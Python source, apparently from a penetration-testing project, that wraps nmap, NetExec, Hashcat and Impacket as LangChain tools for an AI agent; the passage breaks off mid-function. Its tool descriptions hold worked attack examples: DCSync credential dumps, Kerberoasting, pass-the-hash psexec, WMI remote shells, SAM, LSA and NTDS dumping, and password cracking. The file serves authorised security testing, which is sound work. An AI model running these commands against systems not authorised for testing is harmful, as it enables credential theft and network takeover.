"""
Pentesting tool wrappers for SERPENTER
"""

import subprocess
import shlex
from typing import Optional, List, ClassVar, Dict
from langchain.tools import BaseTool
from pydantic import BaseModel, Field
from rich.console import Console
from rich.prompt import Confirm

console = Console()


def confirm_execution(cmd_display: str, tool_name: str) -> bool:
    """
    Ask user to confirm command execution.
    
    Args:
        cmd_display: Command string to display
        tool_name: Name of the tool being executed
        
    Returns:
        True if user confirms, False if user skips
    """
    console.print(f"\n[bold yellow]Command to execute ({tool_name}):[/bold yellow]")
    console.print(f"[cyan]{cmd_display}[/cyan]")
    
    return Confirm.ask("\nExecute this command?", default=True)


class NmapScanInput(BaseModel):
    """Input for Nmap scan tool"""

    target: str = Field(description="Target IP, subnet (CIDR), or hostname to scan")
    ports: Optional[str] = Field(
        default=None, description="Port specification (e.g., '80,443' or '1-1000')"
    )
    scan_type: Optional[str] = Field(
        default="quick", description="Scan type: 'quick', 'full', 'service', 'vuln'"
    )


class NmapScanTool(BaseTool):
    """Tool for running Nmap network scans"""

    name: str = "nmap_scan"
    description: str = """
    Performs network scanning using Nmap to discover hosts, open ports, and services.
    
    Use this when you need to:
    - Discover live hosts in a subnet
    - Find open ports on a target
    - Identify running services and versions
    - Perform initial reconnaissance
    
    Examples:
    - target="192.168.1.0/24", scan_type="quick" - Quick host discovery
    - target="10.0.0.5", scan_type="service" - Service version detection
    - target="192.168.1.100", ports="445,139,135" - Scan specific ports
    """
    args_schema: type[BaseModel] = NmapScanInput

    def _run(
        self, target: str, ports: Optional[str] = None, scan_type: str = "quick"
    ) -> str:
        """Execute Nmap scan"""

        # Build nmap command based on scan type
        cmd = ["nmap"]

        if scan_type == "quick":
            cmd.extend(["-sn", "-T4"])  # Ping scan, fast
        elif scan_type == "full":
            cmd.extend(["-p-", "-T4", "-A"])  # All ports, OS detection
        elif scan_type == "service":
            cmd.extend(["-sV", "-sC", "-T4"])  # Version detection, default scripts
        elif scan_type == "vuln":
            cmd.extend(["-sV", "--script", "vuln", "-T4"])  # Vulnerability scan
        else:
            cmd.extend(["-sV", "-T4"])  # Default

        # Add port specification if provided
        if ports:
            cmd.extend(["-p", ports])

        cmd.append(target)

        # Add sudo if configured
        if self.config and self.config.use_sudo and "nmap" in self.config.sudo_tools:
            cmd = ["sudo"] + cmd

        # Format command for display
        cmd_display = " ".join(cmd)

        # Ask for confirmation if configured
        if self.config and self.config.confirm_commands:
            if not confirm_execution(cmd_display, "nmap"):
                return "Command skipped by user"

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=300,  # 5 minute timeout
            )

            if result.returncode != 0:
                return f"Nmap scan failed: {result.stderr}"

            return self._parse_nmap_output(result.stdout)

        except subprocess.TimeoutExpired:
            return "Nmap scan timed out after 5 minutes"
        except FileNotFoundError:
            return "Nmap not installed. Install with: sudo apt install nmap (Linux) or brew install nmap (macOS)"
        except Exception as e:
            return f"Error running nmap: {str(e)}"

    def _parse_nmap_output(self, output: str) -> str:
        """Parse and format nmap output for the agent"""
        lines = output.split("\n")

        # Extract key information
        results = {"summary": [], "hosts": [], "ports": []}

        current_host = None
        for line in lines:
            line = line.strip()

            # Host up
            if "Nmap scan report for" in line:
                current_host = line.replace("Nmap scan report for ", "")
                results["hosts"].append(current_host)

            # Open ports
            elif "/tcp" in line or "/udp" in line:
                results["ports"].append(f"{current_host}: {line}")

            # Summary line
            elif "hosts up" in line or "done:" in line:
                results["summary"].append(line)

        # Format results
        formatted = []

        if results["summary"]:
            formatted.append("SCAN SUMMARY:")
            formatted.extend(results["summary"])
            formatted.append("")

        if results["hosts"]:
            formatted.append(f"DISCOVERED HOSTS ({len(results['hosts'])}):")
            for host in results["hosts"]:
                formatted.append(f"  • {host}")
            formatted.append("")

        if results["ports"]:
            formatted.append("OPEN PORTS:")
            for port in results["ports"]:
                formatted.append(f"  • {port}")

        return "\n".join(formatted) if formatted else output


class NetExecInput(BaseModel):
    """Input for NetExec enumeration"""

    target: str = Field(description="Target IP, subnet, or hostname")
    protocol: str = Field(
        default="smb",
        description="Protocol: 'smb', 'winrm', 'ldap', 'rdp', 'ssh', 'vnc', 'ftp', 'mssql'",
    )
    action: Optional[str] = Field(
        default=None,
        description="Action: depends on protocol (e.g., 'shares', 'users', 'sessions' for SMB)",
    )
    username: Optional[str] = Field(
        default=None, description="Username for authentication"
    )
    password: Optional[str] = Field(
        default=None, description="Password for authentication"
    )


class NetExecTool(BaseTool):
    """Generic tool for network enumeration using NetExec (previously CrackMapExec)"""

    name: str = "netexec"
    description: str = """
    Enumerate network services using NetExec across multiple protocols.
    
    IMPORTANT: NetExec command format is: netexec <protocol> <target> [options]
    - Protocol and target are POSITIONAL arguments (not flags)
    
    Use this when you need to:
    - Find details/run exploits via netexec supported protocols
    - Incase you want to explore more netexec options, just run netexec help command to understand what all you can do.
    
    Supported protocols: smb, winrm, ldap, rdp, ssh, vnc, ftp, mssql
    
    Correct command examples (these are not exhaustive):
    - netexec smb 192.168.1.0/24 -u '' -p '' --shares
    - netexec smb 10.0.0.5 -u '' -p '' --users
    - netexec winrm 10.0.0.10
    - netexec ldap 192.168.1.100 -u '' -p '' --users
    
    Tool usage examples:
    - target="192.168.1.0/24", protocol="smb", action="shares" - Find all SMB shares in subnet
    - target="10.0.0.5", protocol="smb", action="users" - Enumerate SMB users
    - target="10.0.0.10", protocol="winrm" - Test WinRM access
    - target="192.168.1.100", protocol="ldap", action="users" - LDAP user enumeration
    """
    args_schema: type[BaseModel] = NetExecInput

    def _run(
        self,
        target: str,
        protocol: str = "smb",
        action: Optional[str] = None,
        username: Optional[str] = None,
        password: Optional[str] = None,
    ) -> str:
        """Execute NetExec enumeration"""

        # Validate protocol
        valid_protocols = ["smb", "winrm", "ldap", "rdp", "ssh", "vnc", "ftp", "mssql"]
        if protocol not in valid_protocols:
            return f"Invalid protocol '{protocol}'. Valid options: {', '.join(valid_protocols)}"

        # Build netexec command
        # Format: netexec <protocol> <target> [options]
        cmd = ["netexec", protocol, target]

        # Add authentication if provided
        if username is not None:
            # Explicit username provided
            cmd.extend(["-u", username])
            if password is not None:
                cmd.extend(["-p", password])
            else:
                # Username but no password - try empty password
                cmd.extend(["-p", ""])
        else:
            # No username provided - try anonymous/null session for protocols that support it
            if protocol in ["smb", "ldap"]:
                # Force null session with explicit empty strings
                cmd.extend(["-u", "", "-p", ""])

        # Add action-specific flags based on protocol
        if action:
            action_flag = self._get_action_flag(protocol, action)
            if action_flag:
                cmd.append(action_flag)

        # Add sudo if configured
        if self.config and self.config.use_sudo and "netexec" in self.config.sudo_tools:
            cmd = ["sudo"] + cmd

        # Format command for display (escape special characters in password)
        cmd_display = " ".join(
            f'"{arg}"' if " " in arg or not arg else arg
            for arg in cmd
        )

        # Ask for confirmation if configured
        if self.config and self.config.confirm_commands:
            if not confirm_execution(cmd_display, "netexec"):
                return "Command skipped by user"

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=180,  # 3 minute timeout
            )

            # NetExec returns output even with non-zero exit codes
            output = result.stdout + result.stderr

            if not output.strip():
                return f"Command: {cmd_display}\n\nNo {protocol.upper()} services found or access denied"

            return self._parse_netexec_output(output, protocol, action, cmd_display)

        except subprocess.TimeoutExpired:
            return "NetExec scan timed out after 3 minutes"
        except FileNotFoundError:
            return "NetExec not installed. Install with: pipx install netexec"
        except Exception as e:
            return f"Error running netexec: {str(e)}"

    def _get_action_flag(self, protocol: str, action: str) -> Optional[str]:
        """Get the appropriate flag for the action based on protocol"""
        action_map = {
            "smb": {
                "shares": "--shares",
                "users": "--users",
                "sessions": "--sessions",
                "disks": "--disks",
                "groups": "--groups",
                "pass-pol": "--pass-pol",
                "rid-brute": "--rid-brute",
                "sam": "--sam",
                "lsa": "--lsa",
                "ntds": "--ntds",
            },
            "ldap": {
                "users": "--users",
                "groups": "--groups",
                "computers": "--computers",
            },
            "winrm": {
                "users": "--users",
            },
        }

        protocol_actions = action_map.get(protocol, {})
        return protocol_actions.get(action)

    def _parse_netexec_output(
        self, output: str, protocol: str, action: Optional[str], cmd_display: str
    ) -> str:
        """Parse and format NetExec output"""
        lines = output.split("\n")

        results = {"hosts": [], "shares": [], "users": [], "groups": [], "errors": [], "other": []}

        for line in lines:
            original_line = line
            line = line.strip()

            # Skip empty lines
            if not line:
                continue

            # Detect hosts (protocol-specific port detection or protocol name)
            if any(x in line for x in ["445", "5985", "389", "3389", "22", "1433", "3306", "21", "5900"]) or \
               any(x in line for x in ["SMB", "WINRM", "LDAP", "RDP", "SSH", "VNC", "FTP", "MSSQL"]):
                results["hosts"].append(original_line)

            # Detect shares (SMB)
            elif "READ" in line or "WRITE" in line:
                results["shares"].append(original_line)

            # Detect users
            elif "User:" in line or "UserName:" in line or "\\User" in line or "[+]" in line and "\\" in line:
                results["users"].append(original_line)

            # Detect groups
            elif "Group:" in line or "GroupName:" in line:
                results["groups"].append(original_line)

            # Detect errors
            elif "ERROR" in line or "DENIED" in line or "STATUS_" in line:
                results["errors"].append(original_line)

            # Capture other meaningful lines (non-empty, not just whitespace)
            elif line and not line.startswith("─") and not line.startswith("│"):
                results["other"].append(original_line)

        # Format output
        formatted = []
        formatted.append(f"Command: {cmd_display}")
        formatted.append("")
        formatted.append(f"{protocol.upper()} ENUMERATION RESULTS:")
        formatted.append("")

        if results["hosts"]:
            formatted.append(f"HOSTS FOUND ({len(results['hosts'])}):")
            for host in results["hosts"]:  # Show all hosts
                formatted.append(f"  • {host}")
            formatted.append("")

        if results["shares"]:
            formatted.append(f"ACCESSIBLE SHARES ({len(results['shares'])}):")
            for share in results["shares"]:  # Show all shares
                formatted.append(f"  • {share}")
            formatted.append("")

        if results["users"]:
            formatted.append(f"USERS ENUMERATED ({len(results['users'])}):")
            for user in results["users"]:  # Show all users
                formatted.append(f"  • {user}")
            formatted.append("")

        if results["groups"]:
            formatted.append(f"GROUPS ENUMERATED ({len(results['groups'])}):")
            for group in results["groups"]:  # Show all groups
                formatted.append(f"  • {group}")
            formatted.append("")

        if results["errors"]:
            formatted.append(f"ERRORS ({len(results['errors'])}):")
            for error in results["errors"]:  # Show all errors
                formatted.append(f"  • {error}")
            formatted.append("")

        # If we didn't capture much through parsing, show raw output
        total_parsed = sum(len(v) for v in [results["hosts"], results["shares"], results["users"], results["groups"], results["errors"]])
        if total_parsed == 0 or (total_parsed < 5 and len(output) > 500):
            # Show raw output if parsing didn't capture much
            formatted.append("FULL OUTPUT:")
            formatted.append("─" * 80)
            formatted.append(output)
        elif results["other"]:
            # Show other lines that might be relevant
            formatted.append("ADDITIONAL OUTPUT:")
            for other in results["other"][:50]:  # Limit other lines to avoid spam
                formatted.append(f"  {other}")

        return "\n".join(formatted)


class HashcatInput(BaseModel):
    """Input for Hashcat password cracking"""

    hash_file: str = Field(description="Path to file containing hashes to crack")
    hash_type: int = Field(
        description="Hashcat hash mode (e.g., 1000=NTLM, 5600=NetNTLMv2, 13100=Kerberoast, 18200=AS-REP)"
    )
    attack_mode: str = Field(
        default="dictionary",
        description="Attack mode: 'dictionary', 'brute-force', 'combinator', 'rule-based', 'mask'"
    )
    wordlist: Optional[str] = Field(
        default=None,
        description="Path to wordlist file (required for dictionary/rule-based attacks)"
    )
    rules: Optional[str] = Field(
        default=None,
        description="Path to rules file (e.g., /usr/share/hashcat/rules/best64.rule)"
    )
    mask: Optional[str] = Field(
        default=None,
        description="Mask pattern for brute-force (e.g., '?u?l?l?l?d?d?d?d' for Ulll1234)"
    )
    output_file: Optional[str] = Field(
        default=None,
        description="Output file for cracked passwords (default: hash_file.cracked)"
    )
    extra_args: Optional[str] = Field(
        default=None,
        description="Additional hashcat arguments (e.g., '--increment --increment-min=4')"
    )


class HashcatTool(BaseTool):
    """Tool for password cracking using Hashcat"""

    name: str = "hashcat"
    description: str = """
    Crack password hashes using Hashcat - the world's fastest password recovery tool.
    
    Use this when you need to:
    - Crack NTLM hashes from SAM/NTDS dumps (hash_type=1000)
    - Crack NetNTLMv2 hashes from responder/relay attacks (hash_type=5600)
    - Crack Kerberoast TGS tickets (hash_type=13100)
    - Crack AS-REP roasted hashes (hash_type=18200)
    - Crack Domain Cached Credentials (hash_type=2100)
    
    COMMON HASH TYPES (AD-focused):
    - 1000: NTLM (most common for Windows)
    - 3000: LM (legacy, weak)
    - 5500: NetNTLMv1
    - 5600: NetNTLMv2 (from responder/LLMNR poisoning)
    - 13100: Kerberos 5 TGS-REP (Kerberoasting)
    - 18200: Kerberos 5 AS-REP (AS-REP Roasting)
    - 2100: Domain Cached Credentials 2 (DCC2/mscash2)
    - 1100: Domain Cached Credentials (DCC/mscash)
    
    ATTACK MODES:
    - dictionary: Use a wordlist (fastest for common passwords)
    - rule-based: Dictionary + rules for mutations (recommended)
    - brute-force: Try all combinations with a mask pattern
    - mask: Same as brute-force
    - combinator: Combine words from two wordlists
    
    MASK CHARACTERS:
    - ?l = lowercase (a-z)
    - ?u = uppercase (A-Z)
    - ?d = digits (0-9)
    - ?s = special chars
    - ?a = all printable
    
    Examples:
    - hash_file="/tmp/ntlm.txt", hash_type=1000, attack_mode="dictionary", wordlist="/usr/share/wordlists/rockyou.txt"
    - hash_file="/tmp/krb.txt", hash_type=13100, attack_mode="rule-based", wordlist="/usr/share/wordlists/rockyou.txt", rules="/usr/share/hashcat/rules/best64.rule"
    - hash_file="/tmp/hashes.txt", hash_type=1000, attack_mode="brute-force", mask="?u?l?l?l?l?d?d?d"
    """
    args_schema: type[BaseModel] = HashcatInput

    def _run(
        self,
        hash_file: str,
        hash_type: int,
        attack_mode: str = "dictionary",
        wordlist: Optional[str] = None,
        rules: Optional[str] = None,
        mask: Optional[str] = None,
        output_file: Optional[str] = None,
        extra_args: Optional[str] = None,
    ) -> str:
        """Execute Hashcat password cracking"""

        # Map attack mode to hashcat -a flag
        attack_modes = {
            "dictionary": 0,
            "combinator": 1,
            "brute-force": 3,
            "mask": 3,
            "rule-based": 0,  # Dictionary with rules
        }

        if attack_mode not in attack_modes:
            return f"Invalid attack mode '{attack_mode}'. Valid: {', '.join(attack_modes.keys())}"

        # Build hashcat command
        cmd = ["hashcat"]

        # Hash type
        cmd.extend(["-m", str(hash_type)])

        # Attack mode
        cmd.extend(["-a", str(attack_modes[attack_mode])])

        # Output file
        if output_file:
            cmd.extend(["-o", output_file])
        else:
            cmd.extend(["-o", f"{hash_file}.cracked"])

        # Show cracked passwords in output
        cmd.append("--show")

        # Potfile to track already cracked
        cmd.append("--potfile-disable")  # Disable for clean runs, can be enabled

        # Force CPU if no GPU (common in VMs/containers)
        # cmd.append("--force")  # Uncomment if needed

        # Hash file
        cmd.append(hash_file)

        # Add wordlist or mask based on attack mode
        if attack_mode in ["dictionary", "rule-based", "combinator"]:
            if not wordlist:
                return "Error: Wordlist required for dictionary/rule-based attacks. Common: /usr/share/wordlists/rockyou.txt"
            cmd.append(wordlist)

            # Add rules for rule-based attack
            if rules or attack_mode == "rule-based":
                rules_file = rules or "/usr/share/hashcat/rules/best64.rule"
                cmd.extend(["-r", rules_file])

        elif attack_mode in ["brute-force", "mask"]:
            if not mask:
                return "Error: Mask required for brute-force attacks. Example: ?u?l?l?l?d?d?d?d"
            cmd.append(mask)

        # Add extra arguments
        if extra_args:
            cmd.extend(extra_args.split())

        # Add sudo if configured
        if self.config and self.config.use_sudo and "hashcat" in self.config.sudo_tools:
            cmd = ["sudo"] + cmd

        # Format command for display
        cmd_display = " ".join(cmd)

        # Ask for confirmation if configured
        if self.config and self.config.confirm_commands:
            if not confirm_execution(cmd_display, "hashcat"):
                return "Command skipped by user"

        # For actual cracking, we need a different approach - run without --show first
        crack_cmd = [c for c in cmd if c != "--show"]

        try:
            # First, try to show already cracked hashes
            show_result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30,
            )

            already_cracked = show_result.stdout.strip()

            # Then run the actual cracking (with timeout)
            # Note: Real cracking can take hours/days, so we use a reasonable timeout
            crack_result = subprocess.run(
                crack_cmd,
                capture_output=True,
                text=True,
                timeout=600,  # 10 minute timeout for demo purposes
            )

            output = crack_result.stdout + crack_result.stderr

            return self._parse_hashcat_output(output, cmd_display, already_cracked, hash_type)

        except subprocess.TimeoutExpired:
            # Cracking timed out - show progress
            return f"""Command: {cmd_display}

HASHCAT TIMEOUT (10 minutes)
Password cracking can take hours or days depending on:
- Hash complexity
- Wordlist size
- Attack mode
- Hardware (GPU vs CPU)

Consider:
1. Running hashcat manually in a separate terminal
2. Using a smaller wordlist first
3. Using targeted rules (e.g., company name + years)
4. Running on a machine with GPU support

Check progress with: hashcat --status
Resume later with: hashcat --restore
"""
        except FileNotFoundError:
            return "Hashcat not installed. Install with: sudo apt install hashcat"
        except Exception as e:
            return f"Error running hashcat: {str(e)}"

    def _parse_hashcat_output(
        self, output: str, cmd_display: str, already_cracked: str, hash_type: int
    ) -> str:
        """Parse and format Hashcat output"""

        hash_type_names = {
            1000: "NTLM",
            3000: "LM",
            5500: "NetNTLMv1",
            5600: "NetNTLMv2",
            13100: "Kerberos TGS (Kerberoast)",
            18200: "Kerberos AS-REP",
            2100: "DCC2 (mscash2)",
            1100: "DCC (mscash)",
        }

        formatted = []
        formatted.append(f"Command: {cmd_display}")
        formatted.append("")
        formatted.append(f"HASHCAT RESULTS ({hash_type_names.get(hash_type, f'Mode {hash_type}')}):")
        formatted.append("─" * 80)

        # Parse cracked passwords
        cracked = []
        for line in output.split("\n"):
            # Hashcat output format: hash:password
            if ":" in line and not line.startswith("[") and not line.startswith("Session"):
                cracked.append(line)

        # Add already cracked from potfile
        if already_cracked:
            formatted.append("")
            formatted.append("PREVIOUSLY CRACKED:")
            for line in already_cracked.split("\n"):
                if line.strip():
                    formatted.append(f"  ✓ {line}")

        if cracked:
            formatted.append("")
            formatted.append(f"NEWLY CRACKED ({len(cracked)}):")
            for cred in cracked:
                formatted.append(f"  ✓ {cred}")
        else:
            formatted.append("")
            formatted.append("No new passwords cracked in this session.")

        # Extract stats from output
        stats = []
        for line in output.split("\n"):
            if any(x in line for x in ["Speed", "Progress", "Recovered", "Time.Started", "Status"]):
                stats.append(line.strip())

        if stats:
            formatted.append("")
            formatted.append("SESSION STATS:")
            for stat in stats[:10]:
                formatted.append(f"  {stat}")

        formatted.append("")
        formatted.append("─" * 80)
        formatted.append("FULL OUTPUT:")
        formatted.append(output)

        return "\n".join(formatted)


class ImpacketInput(BaseModel):
    """Input for generic Impacket tool execution"""

    script: str = Field(
        description="Impacket script name (e.g., 'secretsdump', 'GetUserSPNs', 'psexec', 'wmiexec')"
    )
    target: str = Field(description="Target IP or hostname")
    username: Optional[str] = Field(default=None, description="Username for authentication")
    password: Optional[str] = Field(default=None, description="Password for authentication")
    domain: Optional[str] = Field(default=None, description="Domain name (e.g., 'corp.local')")
    hashes: Optional[str] = Field(
        default=None,
        description="NTLM hashes for pass-the-hash (format: 'LM:NT' or ':NT')"
    )
    dc_ip: Optional[str] = Field(
        default=None,
        description="Domain Controller IP (for Kerberos or when different from target)"
    )
    kerberos: bool = Field(
        default=False,
        description="Use Kerberos authentication (requires valid TGT)"
    )
    aesKey: Optional[str] = Field(
        default=None,
        description="AES key for Kerberos authentication"
    )
    extra_args: Optional[str] = Field(
        default=None,
        description="Additional script-specific arguments (e.g., '-just-dc', '-request', '-outputfile out')"
    )
    output_file: Optional[str] = Field(
        default=None,
        description="Output file for results (if supported by script)"
    )


class ImpacketTool(BaseTool):
    """Generic tool for running any Impacket script"""

    name: str = "impacket"
    description: str = """
    Run any Impacket script for Windows/AD exploitation and enumeration.
    
    AVAILABLE SCRIPTS (common ones):
    
    CREDENTIAL EXTRACTION:
    - secretsdump: Dump SAM/NTDS/LSA secrets, DCSync attack
      extra_args: "-just-dc", "-just-dc-user USERNAME", "-outputfile FILE"
    
    KERBEROS ATTACKS:
    - GetUserSPNs: Kerberoasting - request TGS for SPNs
      extra_args: "-request", "-outputfile FILE", "-dc-ip IP"
    - GetNPUsers: AS-REP Roasting - find users without preauth
      extra_args: "-request", "-outputfile FILE", "-usersfile FILE"
    - getTGT: Request TGT ticket
    - getST: Request Service Ticket
    - ticketer: Create Golden/Silver tickets
      extra_args: "-nthash HASH", "-domain-sid SID", "-spn SPN"
    
    REMOTE EXECUTION:
    - psexec: Remote shell via SMB service
    - wmiexec: Remote shell via WMI (more stealthy)
    - smbexec: Remote shell via SMB
    - atexec: Remote execution via Task Scheduler
    - dcomexec: Remote execution via DCOM
    
    ENUMERATION:
    - lookupsid: Brute force SIDs to find users/groups
      extra_args: "-domain-sids", "500-550" (RID range)
    - samrdump: Dump SAM via SAMR
    - reg: Remote registry operations
      extra_args: "query -keyName HKLM\\..."
    - services: Service control
      extra_args: "list", "start SVCNAME", "stop SVCNAME"
    - rpcdump: Dump RPC endpoints
    - smbclient: Interactive SMB client
      extra_args: "-list", to list shares
    
    SMB OPERATIONS:
    - smbclient: SMB client operations
    - ntlmrelayx: NTLM relay attacks (requires separate setup)
    
    AUTHENTICATION METHODS:
    1. Password: username + password + domain
    2. Pass-the-Hash: username + hashes + domain
    3. Kerberos: username + kerberos=True + dc_ip (requires TGT)
    4. AES Key: username + aesKey + domain
    
    EXAMPLES:
    
    # DCSync attack
    script="secretsdump", dc_ip="192.168.56.10", username="admin", password="Pass123", 
    domain="corp.local", extra_args="-just-dc"
    
    # Kerberoasting
    script="GetUserSPNs", dc_ip="192.168.56.10", username="user", password="pass",
    domain="corp.local", extra_args="-request -outputfile kerberoast.txt"
    
    # AS-REP Roasting
    script="GetNPUsers", dc_ip="192.168.56.10", domain="corp.local",
    extra_args="-usersfile users.txt -request -outputfile asrep.txt"
    
    # Remote shell via WMI
    script="wmiexec", dc_ip="192.168.56.20", username="admin", password="Pass123",
    domain="corp.local"
    
    # Pass-the-Hash psexec
    script="psexec", dc_ip="192.168.56.20", username="Administrator",
    domain="corp.local", hashes=":aad3b435b51404ee"
    
    # SID lookup/brute force
    script="lookupsid", dc_ip="192.168.56.10", username="guest", password="",
    domain="corp.local", extra_args="500-600"
    """
    args_schema: type[BaseModel] = ImpacketInput

    # Map of script names to their .py suffix variants
    SCRIPT_VARIANTS: ClassVar[Dict[str, str]] = {
        "secretsdump": "secretsdump.py",
        "getuserspns": "GetUserSPNs.py",
        "getnpusers": "GetNPUsers.py",
        "psexec": "psexec.py",
        "wmiexec": "wmiexec.py",
        "smbexec": "smbexec.py",
        "atexec": "atexec.py",
        "dcomexec": "dcomexec.py",
        "gettgt": "getTGT.py",
        "getst": "getST.py",
        "ticketer": "ticketer.py",
        "lookupsid": "lookupsid.py",
        "samrdump": "samrdump.py",
        "reg": "reg.py",
        "services": "services.py",
        "rpcdump": "rpcdump.py",
        "smbclient": "smbclient.py",
        "ntlmrelayx": "ntlmrelayx.py",
        "addcomputer": "addcomputer.py",
        "rbcd": "rbcd.py",
        "dacledit": "dacledit.py",
        "owneredit": "owneredit.py",
        "exchanger": "exchanger.py",
        "findDelegation": "findDelegation.py",
        "getPac": "getPac.py",
        "goldenPac": "goldenPac.py",
        "raiseChild": "raiseChild.py",
        "smbserver": "smbserver.py",
        "ntfs-read": "ntfs-read.py",
        "mssqlclient": "mssqlclient.py",
        "mssqlinstance": "mssqlinstance.py",
        "dpapi": "dpapi.py",
        "mimikatz": "mimikatz.py",
        "wmipersist": "wmipersist.py",
    }

    def _run(
        self,
        script: str,
        target: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        dc_ip: Optional[str] = None,
        kerberos: bool = False,
        aesKey: Optional[str] = None,
        extra_args: Optional[str] = None,
        output_file: Optional[str] = None,
    ) -> str:
        """Execute Impacket script"""

        # Resolve script name to actual binary
        script_lower = script.lower().replace(".py", "").replace("-", "").replace("_", "")
        script_binary = self.SCRIPT_VARIANTS.get(script_lower, f"{script}.py")

        # Build credential string for most scripts: [domain/]user[:password]@target
        cred_string = ""
        if domain:
            cred_string = f"{domain}/"
        if username:
            cred_string += username
        if password and not hashes:
            cred_string += f":{password}"
        cred_string += f"@{target}"

        # Build command
        cmd = [script_binary]

        # Some scripts need target differently
        scripts_without_cred_string = ["ntlmrelayx", "smbserver", "ticketer", "getTGT", "getST"]
        script_base = script_binary.replace(".py", "")
        
        if script_base.lower() in [s.lower() for s in scripts_without_cred_string]:
            # These scripts have different argument patterns
            if domain:
                cmd.extend(["-domain", domain])
            if username:
                cmd.extend(["-user", username])
            if target and script_base.lower() not in ["ticketer", "ntlmrelayx", "smbserver"]:
                cmd.append(target)
        else:
            # Standard credential string format
            cmd.append(cred_string)

        # Add authentication options
        if hashes:
            cmd.extend(["-hashes", hashes])

        if kerberos:
            cmd.append("-k")
            cmd.append("-no-pass")

        if aesKey:
            cmd.extend(["-aesKey", aesKey])

        if dc_ip:
            cmd.extend(["-dc-ip", dc_ip])

        # Add output file if specified and supported
        if output_file:
            cmd.extend(["-outputfile", output_file])

        # Add extra arguments (script-specific)
        if extra_args:
            # Split extra_args but preserve quoted strings
            try:
                extra_list = shlex.split(extra_args)
                cmd.extend(extra_list)
            except ValueError:
                # Fallback to simple split if shlex fails
                cmd.extend(extra_args.split())

        # Add sudo if configured (impacket usually doesn't need sudo, but keeping consistent)
        # Note: Impacket scripts typically don't require sudo
        # if self.config and self.config.use_sudo and "impacket" in self.config.sudo_tools:
        #     cmd = ["sudo"] + cmd

        # Format command for display (mask password)
        cmd_display = " ".join(cmd)
        if password:
            cmd_display = cmd_display.replace(f":{password}@", ":***@")

        # Ask for confirmation if configured
        if self.config and self.config.confirm_commands:
            if not confirm_execution(cmd_display, "impacket"):
                return "Command skipped by user"

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=300,  # 5 minute timeout
            )

            output = result.stdout + result.stderr

            if not output.strip():
                return f"Command: {cmd_display}\n\nNo output - check credentials and target"

            return self._format_output(output, cmd_display, script_binary)

        except subprocess.TimeoutExpired:
            return f"Command: {cmd_display}\n\nTimeout after 5 minutes (script may still be running)"
        except FileNotFoundError:
            return f"{script_binary} not found. Install Impacket:\n  pipx install impacket\n  # or\n  pip install impacket"
        except Exception as e:
            return f"Error running {script_binary}: {str(e)}"

    def _format_output(self, output: str, cmd_display: str, script: str) -> str:
        """Format Impacket output with command and structured sections"""

        script_lower = script.lower().replace(".py", "")
        
        formatted = []
        formatted.append(f"Command: {cmd_display}")
        formatted.append("")
        formatted.append(f"IMPACKET [{script}] RESULTS:")
        formatted.append("─" * 80)

        # Script-specific parsing
        if "secretsdump" in script_lower:
            return self._parse_secretsdump(output, cmd_display)
        elif "getuserspns" in script_lower:
            return self._parse_kerberoast(output, cmd_display)
        elif "getnpusers" in script_lower:
            return self._parse_asrep(output, cmd_display)
        elif "lookupsid" in script_lower:
            return self._parse_lookupsid(output, cmd_display)
        else:
            # Generic output formatting
            formatted.append("")
            formatted.append(output)
            formatted.append("")
            formatted.append("─" * 80)
            return "\n".join(formatted)

    def _parse_secretsdump(self, output: str, cmd_display: str) -> str:
        """Parse secretsdump output"""
        formatted = [f"Command: {cmd_display}", "", "SECRETSDUMP RESULTS:", "─" * 80]

        sam_hashes = []
        ntds_hashes = []
        lsa_secrets = []
        kerberos_keys = []
        errors = []

        current_section = None
        for line in output.split("\n"):
            line_stripped = line.strip()

            if "[*] Dumping local SAM" in line:
                current_section = "sam"
            elif "[*] Dumping Domain Credentials" in line or "NTDS.DIT" in line:
                current_section = "ntds"
            elif "[*] Dumping LSA" in line:
                current_section = "lsa"
            elif "Kerberos keys" in line.lower():
                current_section = "kerberos"

            if ":::" in line_stripped and not line_stripped.startswith("["):
                if current_section == "sam":
                    sam_hashes.append(line_stripped)
                else:
                    ntds_hashes.append(line_stripped)
            elif "aes256-cts" in line_stripped.lower() or "aes128-cts" in line_stripped.lower():
                kerberos_keys.append(line_stripped)
            elif "DPAPI" in line_stripped or "NL$KM" in line_stripped or "_SC_" in line_stripped:
                lsa_secrets.append(line_stripped)
            elif "[-]" in line_stripped:
                errors.append(line_stripped)

        if ntds_hashes:
            formatted.extend(["", f"NTDS HASHES ({len(ntds_hashes)} accounts):"])
            formatted.extend(f"  {h}" for h in ntds_hashes[:100])
            if len(ntds_hashes) > 100:
                formatted.append(f"  ... and {len(ntds_hashes) - 100} more")

        if sam_hashes:
            formatted.extend(["", f"SAM HASHES ({len(sam_hashes)} accounts):"])
            formatted.extend(f"  {h}" for h in sam_hashes)

        if kerberos_keys:
            formatted.extend(["", f"KERBEROS KEYS ({len(kerberos_keys)}):"])
            formatted.extend(f"  {k}" for k in kerberos_keys[:30])

        if lsa_secrets:
            formatted.extend(["", f"LSA SECRETS ({len(lsa_secrets)}):"])
            formatted.extend(f"  {s}" for s in lsa_secrets[:30])

        if errors:
            formatted.extend(["", "ERRORS:"])
            formatted.extend(f"  {e}" for e in errors[:10])

        if not any([ntds_hashes, sam_hashes, kerberos_keys, lsa_secrets]):
            formatted.extend(["", "RAW OUTPUT:", output])

        formatted.extend(["", "─" * 80])
        return "\n".join(formatted)

    def _parse_kerberoast(self, output: str, cmd_display: str) -> str:
        """Parse GetUserSPNs (Kerberoasting) output"""
        formatted = [f"Command: {cmd_display}", "", "KERBEROASTING RESULTS:", "─" * 80]

        spns = []
        tickets = []
        
        for line in output.split("\n"):
            if "$krb5tgs$" in line:
                tickets.append(line.strip())
            elif "ServicePrincipalName" not in line and "/" in line and "@" not in line:
                # Likely an SPN entry
                if line.strip():
                    spns.append(line.strip())

        if spns:
            formatted.extend(["", f"SERVICE PRINCIPAL NAMES ({len(spns)}):"])
            formatted.extend(f"  {s}" for s in spns)

        if tickets:
            formatted.extend(["", f"TGS TICKETS CAPTURED ({len(tickets)}):"])
            for t in tickets:
                # Truncate the hash for display
                if len(t) > 150:
                    formatted.append(f"  {t[:150]}...")
